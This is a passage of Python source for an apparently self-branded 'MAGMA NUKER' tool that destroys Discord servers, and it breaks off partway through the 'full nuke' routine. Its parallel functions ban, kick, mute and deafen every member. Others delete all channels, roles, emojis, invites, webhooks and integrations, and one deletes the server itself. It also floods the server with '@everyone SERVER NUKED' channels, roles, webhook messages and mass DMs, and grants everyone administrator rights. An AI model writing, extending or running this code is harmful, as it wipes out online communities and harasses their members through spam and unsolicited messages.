async def fetch_emojis(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/emojis")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_invites(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/invites")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_bans(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/bans")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_stickers(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/stickers")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_integrations(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/integrations")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_guild(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}")
    return d if is_ok(st) and isinstance(d, dict) else None

# ─────────────────────────────────────────────
#  100X TURBO ACTION EXECUTORS
# ─────────────────────────────────────────────

async def exec_delete_all_channels(s, p):
    await broadcast("action_start", {"name": "DELETE ALL CHANNELS (TURBO)"})
    items = await fetch_channels(s)
    await blog("INFO", f"⚡ Turbo-deleting {len(items)} channels in parallel...")
    async def _d(ch):
        st, body = await ddel(s, f"/channels/{ch['id']}")
        if is_ok(st): await blog("SUCCESS", f"Deleted #{ch.get('name', ch['id'])}")
        else: await blog("ERROR", f"Failed #{ch.get('name', ch['id'])} — {err_msg(body, st)}")
    await parallel([_d(c) for c in items])

async def exec_delete_all_roles(s, p):
    await broadcast("action_start", {"name": "DELETE ALL ROLES (TURBO)"})
    all_roles = await fetch_roles(s)
    items = [r for r in all_roles if r.get("name") != "@everyone" and not r.get("managed")]
    await blog("INFO", f"⚡ Turbo-deleting {len(items)} unmanaged roles in parallel...")
    async def _d(role):
        st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/roles/{role['id']}")
        if is_ok(st): await blog("SUCCESS", f"Deleted @{role.get('name', role['id'])}")
        else: await blog("ERROR", f"Failed @{role.get('name', role['id'])} — {err_msg(body, st)}")
    await parallel([_d(r) for r in items])

async def exec_ban_all(s, p):
    await broadcast("action_start", {"name": "BAN ALL MEMBERS (TURBO)"})
    all_m = await fetch_members(s)
    items = [m for m in all_m if not_self(m["user"]["id"])]
    delete_days = p.get("delete_days", 7)
    await blog("INFO", f"⚡ Turbo-banning {len(items)} members in parallel...")
    async def _b(m):
        uid = m["user"]["id"]
        uname = m["user"].get("username", uid)
        st, body = await dput(s, f"/guilds/{SESSION['guild_id']}/bans/{uid}", json={"delete_message_days": delete_days})
        if is_ok(st): await blog("SUCCESS", f"Banned: {uname} ({uid})")
        else: await blog("ERROR", f"Failed ban {uname} — {err_msg(body, st)}")
    await parallel([_b(m) for m in items])

async def exec_kick_all(s, p):
    await broadcast("action_start", {"name": "KICK ALL MEMBERS (TURBO)"})
    all_m = await fetch_members(s)
    items = [m for m in all_m if not_self(m["user"]["id"])]
    await blog("INFO", f"⚡ Turbo-kicking {len(items)} members in parallel...")
    async def _k(m):
        uid = m["user"]["id"]
        uname = m["user"].get("username", uid)
        st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/members/{uid}")
        if is_ok(st): await blog("SUCCESS", f"Kicked: {uname} ({uid})")
        else: await blog("ERROR", f"Failed kick {uname} — {err_msg(body, st)}")
    await parallel([_k(m) for m in items])

async def exec_spam_channels(s, p):
    await broadcast("action_start", {"name": "SPAM CREATE CHANNELS (TURBO)"})
    count = int(p.get("ch_count", 50))
    prefix = p.get("ch_prefix", "magma")
    await blog("INFO", f"⚡ Rapid-creating {count} channels with red banner embeds & @everyone pings...")
    async def _c(_):
        name = f"{prefix}-{randstr(4)}"
        st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/channels",
                               json={"name": name, "type": 0, "topic": f"⚡ {tool_name()} — DOMINATED"})
        if is_ok(st) and isinstance(body, dict):
            cid = body.get("id")
            await blog("SUCCESS", f"Created #{name} → firing red embed")
            if cid:
                if not SESSION.get("cdn_banner_url"):
                    await ensure_discord_cdn_banner(s, channel_id=cid)
                cur_payload = make_embed_payload(title=f"{tool_name()} STRIKE")
                st2, body2 = await dpost(s, f"/channels/{cid}/messages", json=cur_payload)
                if is_ok(st2):
                    await blog("SUCCESS", f"Embed sent in #{name}")
                else:
                    await blog("ERROR", f"Embed failed in #{name} — {err_msg(body2, st2)}")
        else:
            await blog("ERROR", f"Failed #{name} — {err_msg(body, st)}")
    await parallel([_c(i) for i in range(count)])

async def exec_spam_roles(s, p):
    await broadcast("action_start", {"name": "SPAM CREATE ROLES (TURBO)"})
    count = int(p.get("role_count", 50))
    prefix = p.get("role_prefix", "magma")
    await blog("INFO", f"⚡ Rapid-creating {count} roles in parallel...")
    async def _c(_):
        name = f"{prefix}-{randstr(4)}"
        color = 0xFF2233  # Red theme role color
        st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/roles", json={"name": name, "color": color})
        if is_ok(st): await blog("SUCCESS", f"Created @{name}")
        else: await blog("ERROR", f"Failed @{name} — {err_msg(body, st)}")
    await parallel([_c(i) for i in range(count)])

async def exec_mass_message(s, p):
    await broadcast("action_start", {"name": "MASS MESSAGE (100X TURBO)"})
    raw_msg = p.get("mm_msg") or f"@everyone {watermark_text()} — **SERVER NUKED**"
    count = int(p.get("mm_count", 5))
    chs = [c for c in await fetch_channels(s) if c.get("type") in (0, 5)]
    if not SESSION.get("cdn_banner_url") and chs:
        await ensure_discord_cdn_banner(s, channel_id=chs[0]["id"])
    await blog("INFO", f"⚡ Turbo-broadcasting red banner embeds {count}x across {len(chs)} channels...")
    msg_payload = make_embed_payload(content=raw_msg, title=f"{tool_name()} BROADCAST")
    tasks = []
    for ch in chs:
        cid = ch["id"]
        cname = ch.get("name", "channel")
        for _ in range(count):
            async def _send(cid=cid, cname=cname):
                st, body = await dpost(s, f"/channels/{cid}/messages", json=msg_payload)
                if is_ok(st): await blog("SUCCESS", f"Sent embed in #{cname}")
                else: await blog("ERROR", f"Failed #{cname} — {err_msg(body, st)}")
            tasks.append(_send())
    await parallel(tasks)

async def exec_rename_channels(s, p):
    await broadcast("action_start", {"name": "RENAME ALL CHANNELS (TURBO)"})
    name = p.get("rename_ch", "magma-nuked")
    items = await fetch_channels(s)
    await blog("INFO", f"⚡ Renaming {len(items)} channels in parallel...")
    async def _r(ch):
        st, body = await dpatch(s, f"/channels/{ch['id']}", json={"name": name})
        if is_ok(st): await blog("SUCCESS", f"Renamed #{ch.get('name')} → #{name}")
        else: await blog("ERROR", f"Failed #{ch.get('name')} — {err_msg(body, st)}")
    await parallel([_r(c) for c in items])

async def exec_rename_roles(s, p):
    await broadcast("action_start", {"name": "RENAME ALL ROLES (TURBO)"})
    name = p.get("rename_role", "magma-nuked")
    items = [r for r in await fetch_roles(s) if r.get("name") != "@everyone" and not r.get("managed")]
    await blog("INFO", f"⚡ Renaming {len(items)} roles in parallel...")
    async def _r(role):
        st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}/roles/{role['id']}", json={"name": name})
        if is_ok(st): await blog("SUCCESS", f"Renamed @{role.get('name')} → @{name}")
        else: await blog("ERROR", f"Failed @{role.get('name')} — {err_msg(body, st)}")
    await parallel([_r(r) for r in items])

async def exec_rename_server(s, p):
    await broadcast("action_start", {"name": "RENAME SERVER"})
    name = p.get("server_name", "MAGMA DOMINATION")
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}", json={"name": name})
    if is_ok(st): await blog("SUCCESS", f"Server renamed to: {name}")
    else: await blog("ERROR", f"Failed rename server — {err_msg(body, st)}")

async def exec_delete_emojis(s, p):
    await broadcast("action_start", {"name": "DELETE ALL EMOJIS (TURBO)"})
    items = await fetch_emojis(s)
    await blog("INFO", f"⚡ Deleting {len(items)} emojis in parallel...")
    async def _d(e):
        st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/emojis/{e['id']}")
        if is_ok(st): await blog("SUCCESS", f"Deleted :{e.get('name','emoji')}:")
        else: await blog("ERROR", f"Failed emoji {e.get('name')} — {err_msg(body, st)}")
    await parallel([_d(e) for e in items])

async def exec_delete_stickers(s, p):
    await broadcast("action_start", {"name": "DELETE ALL STICKERS (TURBO)"})
    items = await fetch_stickers(s)
    await blog("INFO", f"⚡ Deleting {len(items)} stickers in parallel...")
    async def _d(sk):
        st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/stickers/{sk['id']}")
        if is_ok(st): await blog("SUCCESS", f"Deleted sticker: {sk.get('name')}")
        else: await blog("ERROR", f"Failed sticker {sk.get('name')} — {err_msg(body, st)}")
    await parallel([_d(sk) for sk in items])

async def exec_delete_invites(s, p):
    await broadcast("action_start", {"name": "DELETE ALL INVITES (TURBO)"})
    items = await fetch_invites(s)
    await blog("INFO", f"⚡ Revoking {len(items)} invites in parallel...")
    async def _d(inv):
        st, body = await ddel(s, f"/invites/{inv['code']}")
        if is_ok(st): await blog("SUCCESS", f"Revoked invite: {inv['code']}")
        else: await blog("ERROR", f"Failed invite {inv['code']} — {err_msg(body, st)}")
    await parallel([_d(i) for i in items])

async def exec_delete_webhooks(s, p):
    await broadcast("action_start", {"name": "DELETE ALL WEBHOOKS (TURBO)"})
    chs = await fetch_channels(s)
    async def _d(ch):
        st, whs = await dget(s, f"/channels/{ch['id']}/webhooks")
        if not is_ok(st) or not isinstance(whs, list): return
        for wh in whs:
            st2, body2 = await ddel(s, f"/webhooks/{wh['id']}")
            if is_ok(st2): await blog("SUCCESS", f"Deleted webhook: {wh.get('name', wh['id'])}")
            else: await blog("ERROR", f"Failed webhook {wh['id']} — {err_msg(body2, st2)}")
    await parallel([_d(c) for c in chs])

async def exec_spam_webhooks(s, p):
    await broadcast("action_start", {"name": "SPAM WEBHOOKS (TURBO)"})
    count = int(p.get("wh_count", 5))
    chs   = [c for c in await fetch_channels(s) if c.get("type") in (0, 5)]
    tasks = []
    for ch in chs:
        cid = ch["id"]
        cname = ch.get("name", "channel")
        for _ in range(count):
            async def _c(cid=cid, cname=cname):
                name = f"{tool_name().replace(' ', '-')[:16]}-{randstr(4)}"
                st, body = await dpost(s, f"/channels/{cid}/webhooks", json={"name": name})
                if is_ok(st) and isinstance(body, dict):
                    await blog("SUCCESS", f"Webhook '{name}' created in #{cname}")
                    wh_token = body.get("token")
                    wh_id    = body.get("id")
                    if wh_token and wh_id:
                        wh_payload = make_embed_payload(
                            content=f"@everyone {watermark_text()} — **SERVER NUKED**",
                            title=f"{tool_name()} WEBHOOK STRIKE")
                        wh_payload["username"] = tool_name()
                        st2, body2 = await dpost(s, f"/webhooks/{wh_id}/{wh_token}", json=wh_payload)
                        if is_ok(st2):
                            await blog("SUCCESS", f"Webhook embed sent in #{cname}")
                        else:
                            await blog("ERROR", f"Webhook embed failed #{cname} — {err_msg(body2, st2)}")
                else:
                    await blog("ERROR", f"Failed webhook in #{cname} — {err_msg(body, st)}")
            tasks.append(_c())
    await parallel(tasks)

async def exec_delete_integrations(s, p):
    await broadcast("action_start", {"name": "DELETE INTEGRATIONS (TURBO)"})
    all_items = await fetch_integrations(s)
    items = [i for i in all_items if not_self_integration(i)]
    await blog("INFO", f"⚡ Deleting {len(items)} third-party integrations...")
    async def _d(intg):
        st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/integrations/{intg['id']}")
        if is_ok(st): await blog("SUCCESS", f"Deleted integration: {intg.get('name', intg['id'])}")
        else: await blog("ERROR", f"Failed integration {intg['id']} — {err_msg(body, st)}")
    await parallel([_d(i) for i in items])

async def exec_grant_admin(s, p):
    await broadcast("action_start", {"name": "GRANT @EVERYONE ADMIN"})
    roles = await fetch_roles(s)
    everyone = next((r for r in roles if r.get("name") == "@everyone"), None)
    if not everyone:
        await blog("ERROR", "Could not locate @everyone role")
        return
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}/roles/{everyone['id']}", json={"permissions": "8"})
    if is_ok(st): await blog("SUCCESS", "@everyone granted Administrator permissions")
    else: await blog("ERROR", f"Failed to grant Admin to @everyone — {err_msg(body, st)}")

async def exec_revoke_everyone(s, p):
    await broadcast("action_start", {"name": "REVOKE @EVERYONE PERMS"})
    roles = await fetch_roles(s)
    everyone = next((r for r in roles if r.get("name") == "@everyone"), None)
    if not everyone:
        await blog("ERROR", "Could not locate @everyone role")
        return
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}/roles/{everyone['id']}", json={"permissions": "0"})
    if is_ok(st): await blog("SUCCESS", "@everyone permissions stripped to 0")
    else: await blog("ERROR", f"Failed to strip @everyone permissions — {err_msg(body, st)}")

async def exec_mute_all(s, p):
    await broadcast("action_start", {"name": "MUTE ALL MEMBERS (TURBO)"})
    all_m = await fetch_members(s)
    items = [m for m in all_m if not_self(m["user"]["id"])]
    await blog("INFO", f"⚡ Server muting {len(items)} members in parallel...")
    async def _m(m):
        uid = m["user"]["id"]
        uname = m["user"].get("username", uid)
        st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}/members/{uid}", json={"mute": True})
        if is_ok(st): await blog("SUCCESS", f"Muted: {uname}")
        else: await blog("ERROR", f"Failed mute {uname} — {err_msg(body, st)}")
    await parallel([_m(m) for m in items])

async def exec_deafen_all(s, p):
    await broadcast("action_start", {"name": "DEAFEN ALL MEMBERS (TURBO)"})
    all_m = await fetch_members(s)
    items = [m for m in all_m if not_self(m["user"]["id"])]
    await blog("INFO", f"⚡ Server deafening {len(items)} members in parallel...")
    async def _d(m):
        uid = m["user"]["id"]
        uname = m["user"].get("username", uid)
        st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}/members/{uid}", json={"deaf": True})
        if is_ok(st): await blog("SUCCESS", f"Deafened: {uname}")
        else: await blog("ERROR", f"Failed deafen {uname} — {err_msg(body, st)}")
    await parallel([_d(m) for m in items])

async def exec_delete_server(s, p):
    await broadcast("action_start", {"name": "DELETE SERVER"})
    st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}")
    if is_ok(st): await blog("SUCCESS", "Server deleted permanently")
    else: await blog("ERROR", f"Failed delete server — {err_msg(body, st)}")

async def exec_remove_icon(s, p):
    await broadcast("action_start", {"name": "REMOVE SERVER ICON"})
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}", json={"icon": None})
    if is_ok(st): await blog("SUCCESS", "Server icon wiped")
    else: await blog("ERROR", f"Failed remove icon — {err_msg(body, st)}")

async def exec_change_region(s, p):
    await broadcast("action_start", {"name": "CHANGE VOICE REGION"})
    region = p.get("region", "us-east")
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}", json={"region": region})
    if is_ok(st): await blog("SUCCESS", f"Voice region set to: {region}")
    else: await blog("ERROR", f"Failed change region — {err_msg(body, st)}")

async def exec_set_verification(s, p):
    await broadcast("action_start", {"name": "SET VERIFICATION LEVEL"})
    level = int(p.get("verif_level", 4))
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}", json={"verification_level": level})
    if is_ok(st): await blog("SUCCESS", f"Verification level set to {level}")
    else: await blog("ERROR", f"Failed verification level — {err_msg(body, st)}")

async def exec_set_explicit(s, p):
    await broadcast("action_start", {"name": "SET EXPLICIT FILTER"})
    level = int(p.get("explicit_level", 0))
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}", json={"explicit_content_filter": level})
    if is_ok(st): await blog("SUCCESS", f"Explicit content filter set to {level}")
    else: await blog("ERROR", f"Failed explicit filter — {err_msg(body, st)}")

async def exec_ban_specific(s, p):
    await broadcast("action_start", {"name": "BAN SPECIFIC USER"})
    uid = str(p.get("ban_uid", "")).strip()
    days = int(p.get("ban_days", 7))
    if not uid:
        await blog("ERROR", "No target User ID provided")
        return
    st, body = await dput(s, f"/guilds/{SESSION['guild_id']}/bans/{uid}", json={"delete_message_days": days})
    if is_ok(st): await blog("SUCCESS", f"Banned user: {uid}")
    else: await blog("ERROR", f"Failed ban {uid} — {err_msg(body, st)}")

async def exec_unban_specific(s, p):
    await broadcast("action_start", {"name": "UNBAN SPECIFIC USER"})
    uid = str(p.get("unban_uid", "")).strip()
    if not uid:
        await blog("ERROR", "No target User ID provided")
        return
    st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/bans/{uid}")
    if is_ok(st): await blog("SUCCESS", f"Unbanned user: {uid}")
    else: await blog("ERROR", f"Failed unban {uid} — {err_msg(body, st)}")

async def exec_kick_specific(s, p):
    await broadcast("action_start", {"name": "KICK SPECIFIC USER"})
    uid = str(p.get("kick_uid", "")).strip()
    if not uid:
        await blog("ERROR", "No target User ID provided")
        return
    st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/members/{uid}")
    if is_ok(st): await blog("SUCCESS", f"Kicked user: {uid}")
    else: await blog("ERROR", f"Failed kick {uid} — {err_msg(body, st)}")

async def exec_list_info(s, p):
    await broadcast("action_start", {"name": "LIST SERVER INFO"})
    guild, channels, roles, members = await asyncio.gather(
        fetch_guild(s), fetch_channels(s), fetch_roles(s), fetch_members(s, 100))
    if not guild:
        await blog("ERROR", "Could not fetch guild information")
        return
    info = {
        "Name": guild.get("name"),
        "Guild ID": guild.get("id"),
        "Owner ID": guild.get("owner_id"),
        "Channels Count": len(channels),
        "Roles Count": len(roles),
        "Members Cached": guild.get("approximate_member_count", len(members)),
        "Boost Tier": guild.get("premium_tier", 0),
        "Boost Count": guild.get("premium_subscription_count", 0),
        "Verification Level": guild.get("verification_level", 0)
    }
    for k, v in info.items():
        await blog("INFO", f"{k}: {v}")

async def exec_list_members(s, p):
    await broadcast("action_start", {"name": "LIST MEMBERS"})
    limit = int(p.get("list_limit", 100))
    members = await fetch_members(s, limit=limit)
    await blog("INFO", f"Fetched {len(members)} members:")
    for m in members:
        u = m.get("user", {})
        await blog("INFO", f"{u.get('username','unknown')}#{u.get('discriminator','0')} | ID: {u.get('id')}")

async def exec_list_bans(s, p):
    await broadcast("action_start", {"name": "LIST BANS"})
    bans = await fetch_bans(s)
    await blog("INFO", f"Found {len(bans)} banned accounts:")
    for b in bans:
        u = b.get("user", {})
        await blog("INFO", f"{u.get('username','unknown')} | ID: {u.get('id')} | Reason: {b.get('reason','none')}")

async def exec_unban_all(s, p):
    await broadcast("action_start", {"name": "UNBAN ALL (TURBO)"})
    bans = await fetch_bans(s)
    await blog("INFO", f"⚡ Unbanning {len(bans)} users in parallel...")
    async def _u(b):
        uid = b["user"]["id"]
        st, body = await ddel(s, f"/guilds/{SESSION['guild_id']}/bans/{uid}")
        if is_ok(st): await blog("SUCCESS", f"Unbanned: {b['user'].get('username', uid)}")
        else: await blog("ERROR", f"Failed unban {uid} — {err_msg(body, st)}")
    await parallel([_u(b) for b in bans])

async def exec_create_invites(s, p):
    await broadcast("action_start", {"name": "CREATE INVITES (TURBO)"})
    chs = [c for c in await fetch_channels(s) if c.get("type") == 0]
    await blog("INFO", f"⚡ Generating vanity invites across {len(chs)} channels in parallel...")
    async def _i(ch):
        st, body = await dpost(s, f"/channels/{ch['id']}/invites", json={"max_age": 0, "max_uses": 0, "unique": True})
        if is_ok(st): await blog("SUCCESS", f"#{ch.get('name')} → https://discord.gg/{body.get('code','?')}")
        else: await blog("ERROR", f"Failed #{ch.get('name')} — {err_msg(body, st)}")
    await parallel([_i(c) for c in chs])

async def exec_purge_messages(s, p):
    await broadcast("action_start", {"name": "PURGE ALL MESSAGES (TURBO)"})
    chs = [c for c in await fetch_channels(s) if c.get("type") == 0]
    await blog("INFO", f"⚡ Purging message histories across {len(chs)} channels in parallel...")
    async def _p(ch):
        st, msgs = await dget(s, f"/channels/{ch['id']}/messages", params={"limit": 100})
        if not is_ok(st) or not isinstance(msgs, list): return
        ids = [m["id"] for m in msgs]
        if not ids: return
        if len(ids) == 1:
            st2, body2 = await ddel(s, f"/channels/{ch['id']}/messages/{ids[0]}")
            if is_ok(st2): await blog("SUCCESS", f"Deleted 1 message in #{ch.get('name')}")
            else: await blog("ERROR", f"Failed single delete #{ch.get('name')} — {err_msg(body2, st2)}")
        else:
            st2, body2 = await dpost(s, f"/channels/{ch['id']}/messages/bulk-delete", json={"messages": ids[:100]})
            if is_ok(st2): await blog("SUCCESS", f"Bulk-deleted {len(ids[:100])} in #{ch.get('name')}")
            else: await blog("ERROR", f"Bulk-delete failed #{ch.get('name')} — {err_msg(body2, st2)}")
    await parallel([_p(c) for c in chs])

async def exec_set_slowmode(s, p):
    await broadcast("action_start", {"name": "SET SLOWMODE (TURBO)"})
    delay = int(p.get("slowmode_delay", 21600))
    chs   = [c for c in await fetch_channels(s) if c.get("type") == 0]
    await blog("INFO", f"⚡ Applying {delay}s slowmode to {len(chs)} text channels in parallel...")
    async def _sl(ch):
        st, body = await dpatch(s, f"/channels/{ch['id']}", json={"rate_limit_per_user": delay})
        if is_ok(st): await blog("SUCCESS", f"Slowmode {delay}s in #{ch.get('name')}")
        else: await blog("ERROR", f"Failed slowmode #{ch.get('name')} — {err_msg(body, st)}")
    await parallel([_sl(c) for c in chs])

async def exec_lock_channels(s, p):
    await broadcast("action_start", {"name": "LOCK ALL CHANNELS (TURBO)"})
    roles = await fetch_roles(s)
    eid   = next((r["id"] for r in roles if r.get("name") == "@everyone"), None)
    if not eid:
        await blog("ERROR", "Cannot find @everyone role")
        return
    chs   = [c for c in await fetch_channels(s) if c.get("type") == 0]
    await blog("INFO", f"⚡ Locking permissions on {len(chs)} channels in parallel...")
    async def _l(ch):
        st, body = await dput(s, f"/channels/{ch['id']}/permissions/{eid}",
                              json={"id": eid, "type": 0, "deny": "2048", "allow": "0"})
        if is_ok(st): await blog("SUCCESS", f"Locked #{ch.get('name')}")
        else: await blog("ERROR", f"Failed lock #{ch.get('name')} — {err_msg(body, st)}")
    await parallel([_l(c) for c in chs])

async def exec_unlock_channels(s, p):
    await broadcast("action_start", {"name": "UNLOCK ALL CHANNELS (TURBO)"})
    roles = await fetch_roles(s)
    eid   = next((r["id"] for r in roles if r.get("name") == "@everyone"), None)
    if not eid:
        await blog("ERROR", "Cannot find @everyone role")
        return
    chs   = [c for c in await fetch_channels(s) if c.get("type") == 0]
    await blog("INFO", f"⚡ Unlocking permissions on {len(chs)} channels in parallel...")
    async def _u(ch):
        st, body = await ddel(s, f"/channels/{ch['id']}/permissions/{eid}")
        if is_ok(st): await blog("SUCCESS", f"Unlocked #{ch.get('name')}")
        else: await blog("ERROR", f"Failed unlock #{ch.get('name')} — {err_msg(body, st)}")
    await parallel([_u(c) for c in chs])

async def exec_spam_categories(s, p):
    await broadcast("action_start", {"name": "SPAM CATEGORIES (TURBO)"})
    count = int(p.get("cat_count", 20))
    name = p.get("cat_name", "MAGMA DOMAIN")
    await blog("INFO", f"⚡ Spamming {count} categories in parallel...")
    async def _c(_):
        st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/channels", json={"name": name, "type": 4})
        if is_ok(st): await blog("SUCCESS", f"Created category: {name}")
        else: await blog("ERROR", f"Failed category — {err_msg(body, st)}")
    await parallel([_c(i) for i in range(count)])

async def exec_spam_voice(s, p):
    await broadcast("action_start", {"name": "SPAM VOICE CHANNELS (TURBO)"})
    count = int(p.get("vc_count", 20))
    prefix = p.get("vc_prefix", "magma-vc")
    await blog("INFO", f"⚡ Spamming {count} voice channels in parallel...")
    async def _c(_):
        cname = f"{prefix}-{randstr(4)}"
        st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/channels", json={"name": cname, "type": 2})
        if is_ok(st): await blog("SUCCESS", f"Created VC: {cname}")
        else: await blog("ERROR", f"Failed VC — {err_msg(body, st)}")
    await parallel([_c(i) for i in range(count)])

async def exec_dm_all(s, p):
    await broadcast("action_start", {"name": "DM ALL MEMBERS (TURBO)"})
    raw_msg = p.get("dm_msg") or f"You got nuked by {tool_name()}"
    all_m = await fetch_members(s)
    members = [m for m in all_m if not_self(m["user"]["id"])]
    await blog("INFO", f"⚡ Turbo-broadcasting red banner embeds to {len(members)} members in parallel...")
    dm_payload = make_embed_payload(content=raw_msg, title=f"{tool_name()} NOTICE")
    async def _dm(m):
        uid = m["user"]["id"]
        uname = m["user"].get("username", uid)
        st, body = await dpost(s, "/users/@me/channels", json={"recipient_id": uid})
        if not is_ok(st):
            await blog("ERROR", f"Cannot open DM with {uname} — {err_msg(body, st)}")
            return
        dm_id = body.get("id")
        st2, body2 = await dpost(s, f"/channels/{dm_id}/messages", json=dm_payload)
        if is_ok(st2): await blog("SUCCESS", f"DM'd: {uname}")
        else: await blog("ERROR", f"DM failed to {uname} — {err_msg(body2, st2)}")
    await parallel([_dm(m) for m in members])

async def exec_randomize_colors(s, p):
    await broadcast("action_start", {"name": "RANDOMIZE ROLE COLORS (TURBO)"})
    items = [r for r in await fetch_roles(s) if r.get("name") != "@everyone" and not r.get("managed")]
    await blog("INFO", f"⚡ Randomizing colors on {len(items)} roles in parallel...")
    async def _c(role):
        color = random.randint(0, 0xFFFFFF)
        st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}/roles/{role['id']}", json={"color": color})
        if is_ok(st): await blog("SUCCESS", f"@{role.get('name')} → #{color:06X}")
        else: await blog("ERROR", f"Failed color @{role.get('name')} — {err_msg(body, st)}")
    await parallel([_c(r) for r in items])

async def exec_toggle_mfa(s, p):
    await broadcast("action_start", {"name": "TOGGLE MFA"})
    level = int(p.get("mfa_level", 0))
    st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/mfa", json={"level": level})
    if is_ok(st): await blog("SUCCESS", f"MFA level set to {level}")
    else: await blog("ERROR", f"Failed toggle MFA — {err_msg(body, st)}")

async def exec_set_afk(s, p):
    await broadcast("action_start", {"name": "SET AFK TIMEOUT"})
    timeout = int(p.get("afk_timeout", 60))
    st, body = await dpatch(s, f"/guilds/{SESSION['guild_id']}", json={"afk_timeout": timeout})
    if is_ok(st): await blog("SUCCESS", f"AFK timeout set to {timeout}s")
    else: await blog("ERROR", f"Failed set AFK — {err_msg(body, st)}")

async def exec_export(s, p):
    await broadcast("action_start", {"name": "EXPORT SERVER SNAPSHOT"})
    guild, channels, roles, members, emojis, invites, bans = await asyncio.gather(
        fetch_guild(s), fetch_channels(s), fetch_roles(s), fetch_members(s, 1000),
        fetch_emojis(s), fetch_invites(s), fetch_bans(s))
    data  = {"exported_by_bot": SESSION["bot_tag"], "exported_by_id": SESSION["bot_id"],
             "guild": guild, "channels": channels, "roles": roles, "members": members,
             "emojis": emojis, "invites": invites, "bans": bans}
    ts_now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    fname = os.path.join(LOG_DIR, f"snapshot_{ts_now}_{SESSION['guild_id']}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    await blog("SUCCESS", f"Full server snapshot saved to {fname}")

async def exec_check_perms(s, p):
    await broadcast("action_start", {"name": "CHECK BOT PERMISSIONS"})
    st, u = await dget(s, "/users/@me")
    if is_ok(st): await blog("INFO", f"Bot: {u.get('username')}#{u.get('discriminator','0')} (ID: {u.get('id')})")
    else: await blog("ERROR", f"Cannot fetch bot profile — {err_msg(u, st)}")
    guild = await fetch_guild(s)
    if guild:
        await blog("SUCCESS", f"Bot has access to target guild: '{guild.get('name')}' (ID: {guild.get('id')})")
    else:
        await blog("ERROR", "Bot DOES NOT have access to target guild! Check Guild ID or Bot Invite.")

# ─────────────────────────────────────────────
#  100X TURBO FULL NUKE SEQUENCE
# ─────────────────────────────────────────────

async def exec_full_nuke(s, p):
    await broadcast("action_start", {"name": "★ FULL NUKE (100X TURBO)"})
    t0 = time.perf_counter()
    await blog("ACTION", "⚡ INITIATING 100X TURBO FULL SERVER NUKE SEQUENCE...")

    # Ensure bot identity is MAGMA NUKER
    await rename_bot_identity(s)

    # Phase 1: Server metadata, collateral, and integrations
    await blog("INFO", "⚡ Phase 1: Wiping server info, invites, emojis, stickers, integrations...")
    p1_tasks = [
        exec_rename_server(s, p),
        exec_remove_icon(s, p),
        exec_delete_invites(s, p),
        exec_delete_emojis(s, p),
        exec_delete_stickers(s, p),
        exec_delete_integrations(s, p),
    ]
    await asyncio.gather(*p1_tasks, return_exceptions=True)

    # Phase 2: Members and Roles
    await blog("INFO", "⚡ Phase 2: Banning members & deleting roles in parallel...")
    p2_tasks = [
        exec_ban_all(s, p),
        exec_delete_all_roles(s, p),
    ]
    await asyncio.gather(*p2_tasks, return_exceptions=True)

    # Phase 3: Channel annihilation
    await blog("INFO", "⚡ Phase 3: Obliterating all existing channels...")
    await exec_delete_all_channels(s, p)

    # Phase 4: Channel recreation + instant red banner embed pings + role spam
    ch_count     = int(p.get("ch_count", 50))
    role_count   = int(p.get("role_count", 50))
    pings_per_ch = int(p.get("mm_count", 5))
    prefix       = p.get("ch_prefix", "magma")
    ping_text    = p.get("mm_msg") or f"@everyone {watermark_text()} — **SERVER NUKED**"
    embed_payload = make_embed_payload(content=ping_text, title=f"{tool_name()} DOMINATION")

    await blog("INFO", f"⚡ Phase 4: Spawning {ch_count} channels with instant red banner embed pings & {role_count} roles...")

    async def _spawn_and_ping(i):
        name = f"{prefix}-{randstr(4)}"
        st, body = await dpost(s, f"/guilds/{SESSION['guild_id']}/channels",
                               json={"name": name, "type": 0, "topic": f"⚡ {tool_name()} — DOMINATED"})
        if is_ok(st) and isinstance(body, dict):
            cid = body.get("id")
            cname = body.get("name", name)
            await blog("SUCCESS", f"Created #{cname} → firing red embed pings...")
            if cid:
                if not SESSION.get("cdn_banner_url"):
                    await ensure_discord_cdn_banner(s, channel_id=cid)
                cur_payload = make_embed_payload(content=ping_text, title=f"{tool_name()} DOMINATION")
                for _ in range(pings_per_ch):
                    st2, body2 = await dpost(s, f"/channels/{cid}/messages", json=cur_payload)
                    if is_ok(st2):
                        await blog("SUCCESS", f"Sent embed in #{cname}")
                    else:
                        await blog("ERROR", f"Failed ping #{cname} — {err_msg(body2, st2)}")
        else:
